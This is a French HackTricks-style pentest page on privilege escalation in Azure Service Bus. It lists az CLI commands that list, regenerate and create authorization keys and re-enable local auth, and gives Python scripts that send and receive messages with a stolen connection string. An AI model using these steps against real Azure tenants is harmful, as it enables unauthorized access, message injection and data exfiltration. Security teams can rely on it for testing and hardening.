# Az - Service Bus Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Service Bus

Pour plus d'informations, consultez :

{{#ref}}
../az-services/az-servicebus-enum.md
{{#endref}}

### Microsoft.ServiceBus/namespaces/authorizationrules/listKeys/action OU Microsoft.ServiceBus/namespaces/authorizationrules/regenerateKeys/action

Ces autorisations vous permettent d'obtenir ou de régénérer les clés pour les règles d'autorisation locales au sein d'un espace de noms Service Bus. En utilisant ces clés, il est possible de s'authentifier en tant qu'espace de noms Service Bus, vous permettant d'envoyer des messages à n'importe quelle file d'attente ou sujet, de recevoir des messages de n'importe quelle file d'attente ou abonnement, ou potentiellement d'interagir avec le système de manière à perturber les opérations, usurper des utilisateurs valides ou injecter des données malveillantes dans le flux de messagerie.

Notez qu'en règle générale, la **`RootManageSharedAccessKey` règle a un contrôle total** sur l'espace de noms Service Bus et qu'elle est utilisée par le `az` cli, cependant, d'autres règles avec d'autres valeurs de clé peuvent exister.
```bash
# List keys
az servicebus namespace authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --authorization-rule-name RootManageSharedAccessKey [--authorization-rule-name RootManageSharedAccessKey]

# Regenerate keys
az servicebus namespace authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> [--authorization-rule-name RootManageSharedAccessKey]
```
### Microsoft.ServiceBus/namespaces/AuthorizationRules/write

Avec cette autorisation, il est possible de **créer une nouvelle règle d'autorisation** avec toutes les autorisations et ses propres clés avec :
```bash
az servicebus namespace authorization-rule create --authorization-rule-name "myRule" --namespace-name mynamespacespdemo --resource-group Resource_Group_1 --rights Manage Listen Send
```
>[!WARNING]
>Cette commande ne répond pas avec les clés, vous devez donc les obtenir avec les commandes (et permissions) précédentes afin d'escalader les privilèges.

De plus, avec cette commande (et `Microsoft.ServiceBus/namespaces/authorizationRules/read`), si vous effectuez cette action via l'Azure CLI, il est possible de mettre à jour une règle d'autorisation existante et de lui donner plus de permissions (au cas où elle en manquerait) avec la commande suivante :
```bash
az servicebus namespace authorization-rule update \
--resource-group <MyResourceGroup> \
--namespace-name <MyNamespace> \
--name RootManageSharedAccessKey \
--rights Manage Listen Send
```
### Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/ListKeys/action OU Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/regenerateKeys/action

Des sujets et des files d'attente spécifiques à l'intérieur d'un espace de noms Service Bus peuvent avoir leurs propres règles d'autorisation, qui peuvent être utilisées pour contrôler l'accès à l'entité. En ayant ces autorisations, vous pouvez **récupérer ou régénérer les clés pour ces règles d'autorisation locales**, vous permettant de vous authentifier en tant qu'entité et potentiellement d'envoyer ou de recevoir des messages, de gérer des abonnements ou d'interagir avec le système de manière à perturber les opérations, usurper des utilisateurs valides ou injecter des données malveillantes dans le flux de messages.
```bash
# List keys (topics)
az servicebus topic authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name>

# Regenerate keys (topics)
az servicebus topic authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name>

# List keys (queues)
az servicebus queue authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name>

# Regenerate keys (queues)
az servicebus queue authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name>
```
### Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/write

Avec cette autorisation, il est possible de **créer une nouvelle règle d'autorisation** avec toutes les autorisations et ses propres clés avec :
```bash
# In a topic
az servicebus topic authorization-rule create --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name> --rights Manage Listen Send

# In a queue
az servicebus queue authorization-rule create --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name> --rights Manage Listen Send
```
>[!WARNING]
>Cette commande ne répond pas avec les clés, vous devez donc les obtenir avec les commandes (et permissions) précédentes afin d'escalader les privilèges.

De plus, avec cette commande (et `Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/read`), si vous effectuez cette action via l'Azure CLI, il est possible de mettre à jour une règle d'autorisation existante et de lui donner plus de permissions (au cas où elle en manquerait) avec la commande suivante :
```bash
# In a topic
az servicebus topic authorization-rule update --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name> --rights Manage Listen Send

# In a queue
az servicebus queue authorization-rule update --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name> --rights Manage Listen Send
```
### Microsoft.ServiceBus/namespaces/write (& Microsoft.ServiceBus/namespaces/read si az cli est utilisé)

Avec ces autorisations, **un attaquant peut réactiver "l'authentification locale"** avec la commande suivante et donc toutes les clés des politiques partagées fonctionneront.
```bash
az servicebus namespace update --disable-local-auth false -n <namespace-name> --resource-group <res-group>
```
### Envoyer des messages avec des clés (Microsoft.ServiceBus/namespaces/authorizationRules/listkeys/action OU Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action)

Vous pouvez récupérer le `PrimaryConnectionString`, qui agit comme un identifiant pour le namespace Service Bus. Avec cette chaîne de connexion, vous pouvez vous authentifier complètement en tant que namespace Service Bus, vous permettant d'envoyer des messages à n'importe quelle file d'attente ou sujet et potentiellement d'interagir avec le système de manière à perturber les opérations, usurper des utilisateurs valides ou injecter des données malveillantes dans le flux de messagerie.
```python
#You need to install the following libraries
#pip install azure-servicebus
#pip install aiohttp
#pip install azure-identity

import asyncio
from azure.servicebus.aio import ServiceBusClient
from azure.servicebus import ServiceBusMessage

# Constants
NAMESPACE_CONNECTION_STR = "<PrimaryConnectionString>"
TOPIC_NAME = "<TOPIC_NAME>"

# Function to send a single message to a Service Bus topic
async def send_individual_message(publisher):
# Prepare a single message with updated content
single_message = ServiceBusMessage("Hacktricks-Training: Single Item")
# Send the message to the topic
await publisher.send_messages(single_message)
print("Sent a single message containing 'Hacktricks-Training'")

# Function to send multiple messages to a Service Bus topic
async def send_multiple_messages(publisher):
# Generate a collection of messages with updated content
message_list = [ServiceBusMessage(f"Hacktricks-Training: Item {i+1} in list") for i in range(5)]
# Send the entire collection of messages to the topic
await publisher.send_messages(message_list)
print("Sent a list of 5 messages containing 'Hacktricks-Training'")

# Function to send a grouped batch of messages to a Service Bus topic
async def send_grouped_messages(publisher):
# Send a grouped batch of messages with updated content
async with publisher:
grouped_message_batch = await publisher.create_message_batch()
for i in range(10):
try:
# Append a message to the batch with updated content
grouped_message_batch.add_message(ServiceBusMessage(f"Hacktricks-Training: Item {i+1}"))
except ValueError:
# If batch reaches its size limit, handle by creating another batch
break
# Dispatch the batch of messages to the topic
await publisher.send_messages(grouped_message_batch)
print("Sent a batch of 10 messages containing 'Hacktricks-Training'")

# Main function to execute all tasks
async def execute():
# Instantiate the Service Bus client with the connection string
async with ServiceBusClient.from_connection_string(
conn_str=NAMESPACE_CONNECTION_STR,
logging_enable=True) as sb_client:
# Create a topic sender for dispatching messages to the topic
publisher = sb_client.get_topic_sender(topic_name=TOPIC_NAME)
async with publisher:
# Send a single message
await send_individual_message(publisher)
# Send multiple messages
await send_multiple_messages(publisher)
# Send a batch of messages
await send_grouped_messages(publisher)

# Run the asynchronous execution
asyncio.run(execute())
print("Messages Sent")
print("----------------------------")

```
### Recevoir avec des clés (Microsoft.ServiceBus/namespaces/authorizationRules/listkeys/action OU Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action)

Vous pouvez récupérer le PrimaryConnectionString, qui sert de credential pour le namespace Service Bus. En utilisant cette chaîne de connexion, vous pouvez recevoir des messages de n'importe quelle file d'attente ou abonnement au sein du namespace, permettant l'accès à des données potentiellement sensibles ou critiques, facilitant l'exfiltration de données, ou interférant avec le traitement des messages et les flux de travail des applications.
```python
#You need to install the following libraries
#pip install azure-servicebus
#pip install aiohttp
#pip install azure-identity

import asyncio
from azure.servicebus.aio import ServiceBusClient

NAMESPACE_CONNECTION_STR = "<PrimaryConnectionString>"
TOPIC_NAME = "<TOPIC_NAME>"
SUBSCRIPTION_NAME = "<TOPIC_SUBSCRIPTION_NAME>" #Topic Subscription

# Function to receive and process messages from a Service Bus subscription
async def receive_and_process_messages():
# Create a Service Bus client using the connection string
async with ServiceBusClient.from_connection_string(
conn_str=NAMESPACE_CONNECTION_STR,
logging_enable=True) as servicebus_client:

# Get the Subscription Receiver object for the specified topic and subscription
receiver = servicebus_client.get_subscription_receiver(
topic_name=TOPIC_NAME,
subscription_name=SUBSCRIPTION_NAME,
max_wait_time=5
)

async with receiver:
# Receive messages with a defined maximum wait time and count
received_msgs = await receiver.receive_messages(
max_wait_time=5,
max_message_count=20
)
for msg in received_msgs:
print("Received: " + str(msg))
# Complete the message to remove it from the subscription
await receiver.complete_message(msg)

# Run the asynchronous message processing function
asyncio.run(receive_and_process_messages())
print("Message Receiving Completed")
print("----------------------------")
```
## Références

- https://learn.microsoft.com/en-us/azure/storage/queues/storage-powershell-how-to-use-queues
- https://learn.microsoft.com/en-us/rest/api/storageservices/queue-service-rest-api
- https://learn.microsoft.com/en-us/azure/storage/queues/queues-auth-abac-attributes
- https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-python-how-to-use-topics-subscriptions?tabs=passwordless
- https://learn.microsoft.com/en-us/azure/role-based-access-control/permissions/integration#microsoftservicebus

{{#include ../../../banners/hacktricks-training.md}}
